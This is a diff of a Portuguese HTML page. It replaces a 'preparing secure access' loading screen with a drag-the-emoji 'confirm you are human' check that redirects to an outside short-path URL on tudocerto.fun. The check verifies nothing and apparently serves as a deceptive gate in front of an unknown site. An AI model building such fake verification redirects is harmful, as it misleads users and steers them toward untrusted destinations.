@@ -1,179 +1,251 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Preparando seu acesso...</title>
-
-<style>
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-}
-
-body{
-    min-height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
-    background:linear-gradient(135deg,#0f172a,#111827,#1e293b);
-    color:#fff;
-    overflow:hidden;
-}
-
-.bg{
-    position:fixed;
-    inset:0;
-    opacity:.3;
-    background:
-    radial-gradient(circle at 20% 20%,#3b82f6 0%,transparent 30%),
-    radial-gradient(circle at 80% 80%,#06b6d4 0%,transparent 30%);
-    animation:pulse 6s infinite alternate;
-}
-
-@keyframes pulse{
-    from{transform:scale(1);}
-    to{transform:scale(1.15);}
-}
-
-.card{
-    position:relative;
-    z-index:2;
-    width:92%;
-    max-width:420px;
-    background:rgba(255,255,255,.05);
-    backdrop-filter:blur(20px);
-    border:1px solid rgba(255,255,255,.1);
-    border-radius:24px;
-    padding:35px;
-    text-align:center;
-    box-shadow:0 25px 60px rgba(0,0,0,.35);
-}
-
-.icon{
-    width:90px;
-    height:90px;
-    margin:0 auto 20px;
-    border-radius:50%;
-    display:flex;
-    align-items:center;
-    justify-content:center;
-    font-size:40px;
-    background:rgba(255,255,255,.08);
-}
-
-h1{
-    font-size:24px;
-    margin-bottom:10px;
-}
-
-.desc{
-    color:#cbd5e1;
-    line-height:1.5;
-    font-size:15px;
-}
-
-.loader{
-    width:70px;
-    height:70px;
-    margin:28px auto;
-    border:5px solid rgba(255,255,255,.12);
-    border-top:5px solid #3b82f6;
-    border-radius:50%;
-    animation:spin 1s linear infinite;
-}
-
-@keyframes spin{
-    to{
-        transform:rotate(360deg);
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Verifique para continuar</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      -webkit-tap-highlight-color: transparent;
+      user-select: none;
     }
-}
-
-.progress{
-    width:100%;
-    height:8px;
-    background:rgba(255,255,255,.08);
-    border-radius:999px;
-    overflow:hidden;
-    margin-top:15px;
-}
-
-.progress span{
-    display:block;
-    height:100%;
-    width:40%;
-    background:linear-gradient(90deg,#3b82f6,#06b6d4);
-    border-radius:999px;
-    animation:loading 1.5s infinite;
-}
-
-@keyframes loading{
-    0%{
-        margin-left:-40%;
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #f5f5f5;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px;
+      color: #222;
     }
-    100%{
-        margin-left:100%;
+    .container {
+      background: #fff;
+      border-radius: 20px;
+      padding: 32px 24px;
+      max-width: 360px;
+      width: 100%;
+      box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+      text-align: center;
     }
-}
-
-.status{
-    margin-top:18px;
-    color:#94a3b8;
-    font-size:13px;
-}
-
-.badge{
-    display:inline-flex;
-    align-items:center;
-    gap:8px;
-    margin-top:18px;
-    background:rgba(34,197,94,.15);
-    color:#86efac;
-    padding:10px 14px;
-    border-radius:999px;
-    font-size:13px;
-}
-</style>
+    h1 {
+      font-size: 1.25rem;
+      font-weight: 600;
+      margin-bottom: 8px;
+    }
+    p {
+      font-size: 0.95rem;
+      color: #555;
+      margin-bottom: 32px;
+      line-height: 1.4;
+    }
+    .interaction {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 28px;
+      margin-bottom: 24px;
+    }
+    .emoji {
+      font-size: 52px;
+      cursor: grab;
+      touch-action: none;
+      transition: transform 0.15s ease, opacity 0.15s ease;
+      line-height: 1;
+      z-index: 10;
+    }
+    .emoji:active {
+      cursor: grabbing;
+      transform: scale(1.1);
+    }
+    .emoji.dragging {
+      opacity: 0.6;
+      transform: scale(1.15);
+    }
+    .drop-zone {
+      width: 72px;
+      height: 72px;
+      border-radius: 50%;
+      background: #22c55e;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+      transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
+      box-shadow: 0 4px 14px rgba(34, 197, 94, 0.4);
+    }
+    .drop-zone::after {
+      content: "";
+      width: 28px;
+      height: 28px;
+      border: 3px solid rgba(255,255,255,0.85);
+      border-radius: 50%;
+    }
+    .drop-zone.drag-over {
+      transform: scale(1.12);
+      background: #16a34a;
+      box-shadow: 0 6px 20px rgba(34, 197, 94, 0.55);
+    }
+    .drop-zone.success {
+      background: #16a34a;
+      animation: pulse 0.5s ease;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.15); }
+      100% { transform: scale(1); }
+    }
+    .status {
+      font-size: 0.9rem;
+      color: #666;
+      min-height: 24px;
+      transition: color 0.2s;
+    }
+    .status.loading {
+      color: #16a34a;
+      font-weight: 500;
+    }
+    .arrow {
+      font-size: 28px;
+      color: #94a3b8;
+      animation: bounce 1.4s infinite;
+    }
+    @keyframes bounce {
+      0%, 100% { transform: translateX(0); }
+      50% { transform: translateX(6px); }
+    }
+    .ghost {
+      position: fixed;
+      pointer-events: none;
+      font-size: 52px;
+      z-index: 9999;
+      transform: translate(-50%, -50%);
+      opacity: 0.9;
+      transition: none;
+    }
+  </style>
 </head>
-
 <body>
-
-<div class="bg"></div>
-
-<div class="card">
-
-    <div class="icon">🔒</div>
-
-    <h1>Verificando acesso</h1>
-
-    <p class="desc">
-        Estamos preparando seu acesso seguro.
-        Você será redirecionado automaticamente em alguns instantes.
-    </p>
-
-    <div class="loader"></div>
-
-    <div class="progress">
-        <span></span>
+  <div class="container">
+    <h1>Confirme que você é humano</h1>
+    <p>Arraste o olho 👀 para dentro do círculo verde para continuar</p>
+    <div class="interaction">
+      <div id="emoji" class="emoji" draggable="true">👀</div>
+      <div class="arrow">→</div>
+      <div id="dropZone" class="drop-zone"></div>
     </div>
-
-    <div class="badge">
-        ✓ Conexão segura Estabelecida
-    </div>
-
-    <div class="status">
-        Aguarde alguns segundos...
-    </div>
-
-</div>
-
-<!-- COLE AQUI SEU SCRIPT ORIGINAL SEM ALTERAR NADA -->
+    <div id="status" class="status"></div>
+  </div>
 <script>
-/* seu script atual */
-</script>
+const emoji = document.getElementById("emoji");
+const dropZone = document.getElementById("dropZone");
+const statusEl = document.getElementById("status");
+let isCompleted = false;
+let ghost = null;
 
+// --- Desktop Drag & Drop ---
+emoji.addEventListener("dragstart", (e) => {
+  if (isCompleted) {
+    e.preventDefault();
+    return;
+  }
+  e.dataTransfer.setData("text/plain", "emoji");
+  e.dataTransfer.effectAllowed = "move";
+  emoji.classList.add("dragging");
+});
+emoji.addEventListener("dragend", () => {
+  emoji.classList.remove("dragging");
+  dropZone.classList.remove("drag-over");
+});
+dropZone.addEventListener("dragover", (e) => {
+  e.preventDefault();
+  e.dataTransfer.dropEffect = "move";
+  dropZone.classList.add("drag-over");
+});
+dropZone.addEventListener("dragleave", () => {
+  dropZone.classList.remove("drag-over");
+});
+dropZone.addEventListener("drop", (e) => {
+  e.preventDefault();
+  dropZone.classList.remove("drag-over");
+  if (isCompleted) return;
+  complete();
+});
+
+// --- Touch / Mobile (pointer events) ---
+let isDragging = false;
+emoji.addEventListener("pointerdown", (e) => {
+  if (isCompleted) return;
+  isDragging = true;
+  emoji.setPointerCapture(e.pointerId);
+  ghost = document.createElement("div");
+  ghost.className = "ghost";
+  ghost.textContent = "👀";
+  ghost.style.left = e.clientX + "px";
+  ghost.style.top = e.clientY + "px";
+  document.body.appendChild(ghost);
+  emoji.style.opacity = "0.35";
+});
+emoji.addEventListener("pointermove", (e) => {
+  if (!isDragging || !ghost) return;
+  ghost.style.left = e.clientX + "px";
+  ghost.style.top = e.clientY + "px";
+  const rect = dropZone.getBoundingClientRect();
+  const over =
+    e.clientX >= rect.left &&
+    e.clientX <= rect.right &&
+    e.clientY >= rect.top &&
+    e.clientY <= rect.bottom;
+  if (over) {
+    dropZone.classList.add("drag-over");
+  } else {
+    dropZone.classList.remove("drag-over");
+  }
+});
+emoji.addEventListener("pointerup", (e) => {
+  if (!isDragging) return;
+  isDragging = false;
+  const rect = dropZone.getBoundingClientRect();
+  const over =
+    e.clientX >= rect.left &&
+    e.clientX <= rect.right &&
+    e.clientY >= rect.top &&
+    e.clientY <= rect.bottom;
+  if (ghost) {
+    ghost.remove();
+    ghost = null;
+  }
+  emoji.style.opacity = "1";
+  dropZone.classList.remove("drag-over");
+  if (over && !isCompleted) {
+    complete();
+  }
+});
+emoji.addEventListener("pointercancel", () => {
+  isDragging = false;
+  if (ghost) {
+    ghost.remove();
+    ghost = null;
+  }
+  emoji.style.opacity = "1";
+  dropZone.classList.remove("drag-over");
+});
+
+// --- Função de sucesso ---
+function complete() {
+  isCompleted = true;
+  dropZone.classList.add("success");
+  emoji.style.visibility = "hidden";
+  statusEl.textContent = "Verificado! Redirecionando...";
+  statusEl.classList.add("loading");
+  setTimeout(() => {
+    window.location.href = "https://tudocerto.fun/0a22f826";
+  }, 600);
+}
+</script>
 </body>
 </html>
